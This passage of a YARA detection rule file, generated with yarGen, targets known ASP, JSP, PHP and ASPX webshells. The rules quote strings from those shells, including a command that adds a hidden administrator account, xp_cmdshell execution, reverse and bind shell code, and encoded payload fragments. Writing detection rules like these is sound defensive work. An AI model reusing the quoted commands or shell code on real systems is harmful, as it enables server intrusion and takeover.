      $s7 = "</a><br>\":RRS\"&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm(\"\"\"&RePath(Session(\"FolderPath\")&\"\\data.mdb\")&\"\"\",\"\"" ascii
      $s8 = ">tpircs/<" fullword ascii /* reversed goodware string '</script>' */
      $s9 = "</b></a></td></tr>\":RRS\"<tr><td height='20'><a href='javascript:ShowFolder(\"\"C:\\\\Progra~1\"\")'>->C:\\\\Progra~1</a></td><" ascii
      $s10 = "</a></div></td></tr>\"::RRS\"<tr><td height='22'><a href='?Action=Logout' target='_top'>->" fullword ascii
      $s11 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>->" fullword ascii
      $s12 = "RRS \"<tr><th>Scan WebShell -- " fullword ascii
      $s13 = "</a></td></tr>\":End If::RRS\"<tr><td height='22'><a href='?Action=UpFile' target='FileFrame'>->" fullword ascii
      $s14 = "RRS\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&urL&\"\"\" target=\"\"FileFrame\"\">\":" fullword ascii
      $s15 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=php' target='FileFrame'><b>->" fullword ascii
      $s16 = "</b><div id=menu2 style=\"\"line-height:18px;width:100%;display='none'\"\" onmouseout=\"\"menu2.style.display='none'\"\">\":RRS" ascii
      $s17 = ")</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cplgm&M=3' target='FileFrame'>->" fullword ascii
      $s18 = ")</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=kmuma' target='FileFrame'><b>->" fullword ascii
      $s19 = "RRS\"    <td><input name='c' type='text' id='c' value='cmd /c net user huohu$ huohu /add & net localgroup administrators huohu$ " ascii
      $s20 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Servu' target='FileFrame'><b>->Servu" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _job_ma4_ha_2_520_ma1_19 {
   meta:
      description = "webshell - from files job.jsp, ma4.jsp, ha.jsp, 2.jsp, 520.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash2 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
      hash3 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash4 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
      hash5 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
      hash6 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "_jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword ascii
      $s2 = "_jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword ascii
      $s3 = "p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword ascii
      $s4 = "public void setPassword(String password) throws JshellConfigException {" fullword ascii
      $s5 = "_dbConnection = DriverManager.getConnection(_url, User, Password);" fullword ascii
      $s6 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s7 = "if (_dbStatement.execute(sql)) {" fullword ascii
      $s8 = "dbResult = DBExecute(sql);" fullword ascii
      $s9 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s10 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s11 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s12 = "_jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword ascii
      $s13 = "jshell.write(buffer, start, buffer.length - 1 - start);" fullword ascii
      $s14 = "request.getParameter(\"dbPassword\") == null ||" fullword ascii
      $s15 = "end = dataHeader.indexOf(token, start) - 1;" fullword ascii
      $s16 = "_url = \"jdbc:mysql://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";DatabaseName=" ascii
      $s17 = "_url = \"jdbc:mysql://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";DatabaseName=" ascii
      $s18 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";" ascii
      $s19 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";" ascii
      $s20 = "p = Pattern.compile(\"private\\\\sint\\\\s_sessionOutTime\\\\s=\\\\s\" + _sessionOutTime);" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_5_source_b374k_2_6_source_b374k_2_7_source_20 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.5.source.php, b374k-2.6.source.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash3 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash4 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "setcookie(\"massact\", \"\" ,time() - $s_login_time);" fullword ascii
      $s2 = "setcookie(\"buffer\", \"\" ,time() - $s_login_time);" fullword ascii
      $s3 = "elseif($s_split[0]==\"back\") $s_rstarget_packed = $s_rsport_.\" \".$s_rshost_;" fullword ascii
      $s4 = "$s_rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s5 = "$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());" fullword ascii
      $s6 = "if($s_split[0]==\"bind\") $s_rstarget_packed = $s_rsport_;" fullword ascii
      $s7 = "setcookie(\"cwd\", $s_cwd ,time() + $s_login_time);" fullword ascii
      $s8 = "setcookie(\"b374k\",$s_login,time() + $s_login_time);" fullword ascii
      $s9 = "if(function_exists('pg_connect')) return @pg_connect(\"$s_host_str user=$s_sqluser password=$s_sqlpass\");" fullword ascii
      $s10 = "$s_scriptout = $s_win ? $s_script.\".exe\" : $s_script;" fullword ascii
      $s11 = "gVkqHjiUNhGpgjTDpLOGbLQdaCENJn5NN2WmFLzhW84DoSlPF7AXI26Qhbx5zOi8rIAL6+F5Vm/LN7DACFb19UyS0XW8MqAWp8NxNz74NPx9MTg4bbUWOq0boIvgsAy+" ascii
      $s12 = "$s_rs_win = \"7Vh3WFPZtj8pkEASEiQISDsoCigdRkCDJAICChIBFQtCGhhNMzmhSAsTUEOMxq4ICg6jjgURlSpFcChWHBsKKDrohRvaIBcYUc8NI3e+Ke/73n/vj/" ascii
      $s13 = "T045O4HLFjjdJVCtVuXaqH7U1RfKK5/HvfXYwUlK/u0aaMlqbw/HHGJOGjauv61xlou9ZpfTpuWtL1sXXGEv5kAczbFPUy6XS9Augi8lcmb7ZrjWwFGQN0r+JVeOxNvo" ascii
      $s14 = "if(strtolower(trim($s_pass)) == $s_login){" fullword ascii
      $s15 = "7ntnfO5meinMvruNnqcmXA2XoDVcCc0wCYkzBaZpA7ILRJ/2O2B87jA+QT9UeDRe8svZYAG8b/txc6kc9mA+yqayYPQXwvdmBEOrA5B2p0BtFIYOWKCm5RukWwZyXIbA" ascii
      $s16 = "$s_ldump = \"\";" fullword ascii
      $s17 = "$s_out = ob_get_contents();" fullword ascii
      $s18 = "$s_labelip = \"Target IP\";" fullword ascii
      $s19 = "$s_buff = rs($s_rstype,$s_rstarget_packed,$s_rscode);" fullword ascii
      $s20 = "else $s_dump_tbl = \"\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__UnKnown_Vip__1__UnKnown_Vip_NEW_WebShell__1___2014_10_23_14_54_16_NEW_WebShell_21 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, NEW WebShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash3 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash4 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash5 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
   strings:
      $s1 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
      $s2 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s3 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
      $s4 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
      $s5 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
      $s6 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(replace(replace(FilePath,server.MapPath" ascii
      $s7 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(replace(replace(FilePath,server.MapPath" ascii
      $s8 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(Replace(replace(thePath,server.MapPath(" ascii
      $s9 = "    Conn.Execute(SqlStr)" fullword ascii
      $s10 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>" fullword ascii
      $s11 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
      $s12 = "regEx.Pattern = \"Server.(Exec\"&\"ute|Transfer)([ \\t]*|\\()\"\".*\"\"\"" fullword ascii
      $s13 = "regEx.Pattern = \"Server.(Exec\"&\"ute|Transfer)([ \\t]*|\\()[^\"\"]\\)\"" fullword ascii
      $s14 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>WScr\"&DoMyBest&\"ipt.Shell " fullword ascii
      $s15 = "Report = Report&\"<tr><td height=30>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
      $s16 = "temp=temp&\"<a href='javascript:FullForm(\"\"\"&replace(replace(FilePath,server.MapPath(\"\\\")&\"\\\",\"\",1,1,1),\"\\\",\"" ascii
      $s17 = "temp=temp&\"<a href='javascript:FullForm(\"\"\"&replace(replace(FilePath,server.MapPath(\"\\\")&\"\\\",\"\",1,1,1),\"\\\",\"" ascii
      $s18 = "<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(InFile)&\"\"\" target=_blank>\"& InFile & \"</a>" ascii
      $s19 = "Server.ScriptTimeout=1000000 " fullword ascii
      $s20 = "temp=temp&\"<a href='javascript:FullForm(\"\"\"&replace(replace(FilePath,server.MapPath(\"\\\")&\"\\\",\"\",1,1,1),\"\\\",\"" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp___1__asp__1___2014_10_23_14_54_16_asp__1__asp__1___as_22 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, asp (1)__2014-10-23-14-54-16.asp, asp (1).asp, asp (1).asp, .asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp, vps.asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash4 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash5 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash6 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash7 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash8 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash9 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash10 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $x1 = "></form></tr></table>\":REsPonsE.writE SI:SI=\"\":If trim(REquEst.form(\"MMD\"))<>\"\"  thEn:PaSsword= trim(REquEst.form(\"P\"))" ascii
      $x2 = "'>alue=it' v'submtype=nput '> <iCmd&~~&Deflue='%' vath:92='widStylecmd' ame='put n&~<inSI=SI>~`~ The~)<>~(~cmd.FormquestIf Ren`s" ascii
      $x3 = "sEr ID=\"&id:strQuery = \"exec master.dbo.xp_cmdshell '\" & REquEst.form(\"MMD\") & \"'\":set recREsult = adoConn.Execute(strQue" ascii
      $s4 = "\"\");FullDbStr(0);return false;}return true;}\":RRS\"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = " ascii
      $s5 = "r><br><br><br>teen<c=~SI~`UrckBaI&=SSIl`SIS RR`Ifd En\",Pos):End Function:End Class:sub getTerminalInfo():ExeCute SinfoEn(\" Nex" ascii
      $s6 = " & ~ ePathrr(thshowE`End If`(thePolder.GetFect~)emObjeSystg.Filiptin(~ScrbjecteateOer.Cr Servder =heFolSet tath)`r.FilFolde= the" ascii
      $s7 = "~ th)=~yeript~(~wsc.Formquestif Reen`Sot(1ject(ateObM=CreSet C,0))`~&Def~ /c Path&Shellexec(D=CM.Set DCmd)`eadalout.rD.stdaaa=Dl" ascii
      $s8 = "RRS\"<tr><td height='21'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
      $s9 = "RRS\"<tr><td height='20'><a href='?Action=downloads' target='FileFrame'>" fullword ascii
      $s10 = "ctstemOileSying.Fcriptct(~SeObjeCreatrver.so=SeSet f~)`md.txth(~cmapparver. = sepFileszTemt~)` 0, TFile,zTemp~ & s ~ > Cmd && De" ascii
      $s11 = "sub ScanPort():ExeCute SinfoEn(\"76000 = 77meoutiptTir.ScrServe`~ thet~)=~(~por.Formquestif ren`89,4333,3345,14139,4,135,0,110,2" ascii
      $s12 = "ExeCute SinfoEn(\"lError=kilnerrodow.o;}win trueeturns(){rError killctiont>funscrip=javaguaget lanscripRRS~<rs;~`lse;}rn fa retu" ascii
      $s13 = "ExeCute SinfoEn(\"lError=kilnerrodow.o;}win trueeturns(){rError killctiont>funscrip=javaguaget lanscripRRS~<rs;~`lse;}rn fa retu" ascii
      $s14 = "& h at P &SI= I  S~` Ind Ef`rlkUac&BSII= S ` SRS RI\",Pos):End function:Function CompactMdb(Path):ExeCute SinfoEn(\"enTh) ,1(0ot" ascii
      $s15 = "RRS\"<tr><td height='21'><a href='?Action=hiddenshell' target='FileFrame'>" fullword ascii
      $s16 = "sub ScanPort():ExeCute SinfoEn(\"76000 = 77meoutiptTir.ScrServe`~ thet~)=~(~por.Formquestif ren`89,4333,3345,14139,4,135,0,110,2" ascii
      $s17 = "RRS\"<tr><td height='21'><a href='?Action=ReadREG' target='FileFrame'>" fullword ascii
      $s18 = "fpath=request.servervariables(\"path_translated\"):set fso=server.createobject(\"scripting.filesystemobject\"):pex=\"com1|com2|c" ascii
      $s19 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/goldsun/upadmin/s3\", True, \"\", \"\"" fullword ascii
      $s20 = "End Function:Function CopyFile(Path):ExeCute SinfoEn(\"|~||~|h,at(Pitpl S =thPa)`enTh~ >~)<(1thPad an) 0)h(at(PtsisExleFiF. CIf`" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c5_403_queryDong_000_t00ls1_t00ls_spyjsp2010_23 {
   meta:
      description = "webshell - from files c5.jsp, 403.jsp, queryDong.jsp, 000.jsp, t00ls1.jsp, t00ls.jsp, spyjsp2010.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash3 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash4 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash5 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash6 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash7 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
   strings:
      $x1 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
      $x2 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x3 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $s4 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"\"+(ISLINUX ? \"/bin/bash\" :" ascii
      $s5 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s6 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
      $s7 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
      $s8 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
      $s9 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
      $s10 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"\\\"><input type=\\\"hidden\\\" name=\\\"o\\\" val" ascii
      $s11 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"+" fullword ascii
      $s12 = "((Invoker)ins.get(\"script\")).invoke(request,response,session);" fullword ascii
      $s13 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s14 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total (unkn" ascii
      $s15 = "\\\\cmd.exe\")+\"\\\"/>\"+" fullword ascii
      $s16 = "StreamConnector.readFromRemote(targetS,yourS,new DataInputStream(yourS.getInputStream()),new DataOutputStream(targetS.getOutputS" ascii
      $s17 = "out.println(\"<select id=\\\"catalogs\\\" onchange=\\\"if (this.value == '0') return;doPost({o:'executesql',type:'switch',catalo" ascii
      $s18 = "(new StreamConnector(process.getErrorStream(), socket.getOutputStream())).start();" fullword ascii
      $s19 = "StreamConnector.readFromRemote(targetS,yourS,new DataInputStream(yourS.getInputStream()),new DataOutputStream(targetS.getOutputS" ascii
      $s20 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total (unkn" ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b374k_2_5_source_b374k_2_6_source_24 {
   meta:
      description = "webshell - from files b374k-2.5.source.php, b374k-2.6.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash2 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
   strings:
      $s1 = "if(trim($s_res)=='') $s_result = \"<p class='notif'>Error getting process list</p>\";" fullword ascii
      $s2 = "// http://www.kryogenix.org/code/browser/sorttable/ - this makes the tables" fullword ascii
      $s3 = "$s_res = exe(\"gcc \".$s_script.\".c -o \".$s_scriptout.$s_gccoption);" fullword ascii
      $s4 = "oci_execute($s_st);" fullword ascii
      $s5 = "if(!$s_d = getenv(\"TMP\")) if(!$s_d = getenv(\"TEMP\")) if(!$s_d = getenv(\"TMPDIR\")){" fullword ascii
      $s6 = "while ($s_si = fgets($s_pipes[1])) {" fullword ascii
      $s7 = "if($s_sexecutable && !is_executable($s_c)) continue;" fullword ascii
      $s8 = "file_put_contents($s_script.\".c\", $s_code);" fullword ascii
      $s9 = "file_put_contents($s_script.\".java\", $s_code);" fullword ascii
      $s10 = "file_put_contents($s_script, $s_code);" fullword ascii
      $s11 = "$s_login = strtolower(md5(trim($_REQUEST['login'])));" fullword ascii
      $s12 = "while ($s_se = fgets($s_pipes[2])) {" fullword ascii
      $s13 = "else if(is_file($s_f)) $s_fc = @file_get_contents($s_f);" fullword ascii
      $s14 = "else if (is_file($s_file) === true) $s_zip->addFromString(str_replace($s_src . '/', '', $s_file), @file_get_contents($s_file));" fullword ascii
      $s15 = "$s_result .= \"<tr><td ondblclick=\\\"return go('\".addslashes($s_dump_tbl_link).\"',event);\\\"><a href='\".$s_dump_tbl_link.\"" ascii
      $s16 = "$s_rstarget =" fullword ascii
      $s17 = "$s_result .= \"<tr><td ondblclick=\\\"return go('\".addslashes($s_dump_tbl_link).\"',event);\\\"><a href='\".$s_dump_tbl_link.\"" ascii
      $s18 = "$s_linedump = str_replace(\"<\",\".\",$s_linedump);" fullword ascii
      $s19 = "<td><a href='<?php echo $s_self; ?>x=eval' title='Execute code' onclick='return false;'><div class='menumi'>eval</div></a></td>" fullword ascii
      $s20 = "<pre name='hexdump' id='dump_\".$s_counter.\"' style='margin:0;padding:0;'>\".$s_linedump.\"</pre></td></tr>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _2013110125222650_con2_25 {
   meta:
      description = "webshell - from files 2013110125222650.aspx, con2.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bbee3a7eeceef058919740e7317cd8f552b194badf3cdc6922e42b115fdd7fa9"
      hash2 = "d175b3176f1fb891735a2aaed2bc851074b3b50d4eb99c90146dc6a0eaa26d48"
   strings:
      $x1 = "cmd.ExecuteNonQuery();" fullword ascii
      $x2 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
      $s3 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
      $s4 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\" Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
      $s5 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
      $s6 = "LbNum.Text = ProcessNum + \"" fullword ascii
      $s7 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
      $s8 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\" Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
      $s9 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Documents\\'><font color=\"#009900\">Documents</font></a> </" ascii
      $s10 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'><font color=\"#009900\">All Users</font></a> </td>" fullword ascii
      $s11 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'><font color=\"#009900\">Config</font></a> </td>" fullword ascii
      $s12 = "ListBoxPro.Items.Add(allprocess.ProcessName);" fullword ascii
      $s13 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
      $s14 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
      $s15 = "else if ((page == \"process\") && Session[\"root\"] != null)" fullword ascii
      $s16 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'><font color=\"#009900\">Serv-u" fullword ascii
      $s17 = "Process[] process = Process.GetProcesses();" fullword ascii
      $s18 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" ForeColor=\"#009900\" >c:\\char.txt</asp:TextBox>" fullword ascii
      $s19 = "Process[] killprocess = Process.GetProcesses();" fullword ascii
      $s20 = "else if ((page == \"download\") && (Session[\"root\"] != null))" fullword ascii
   condition:
      ( ( uint16(0) == 0x6967 or uint16(0) == 0x253c ) and filesize < 90KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c5_m_he1p_1_nogfw_JspSpy1_403_luci_jsp_spy2009_queryDong_myxx1_a_config_JspSpyJDK5_JspSpyJDK51_u_000_t00ls1_css_807_jspspy__26 {
   meta:
      description = "webshell - from files c5.jsp, m.jsp, he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, 403.jsp, luci.jsp.spy2009.jsp, queryDong.jsp, myxx1.jsp, a.jsp, config.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, 000.jsp, t00ls1.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, zend.jsp, t00ls.jsp, ma3.jsp, spyjsp2010.jsp, ok.jsp, style.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash3 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash4 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash6 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash7 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash9 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash10 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash11 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash12 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash13 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash14 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash15 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash16 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash17 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash18 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash19 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash20 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash21 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash22 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash23 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash24 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash25 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash26 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
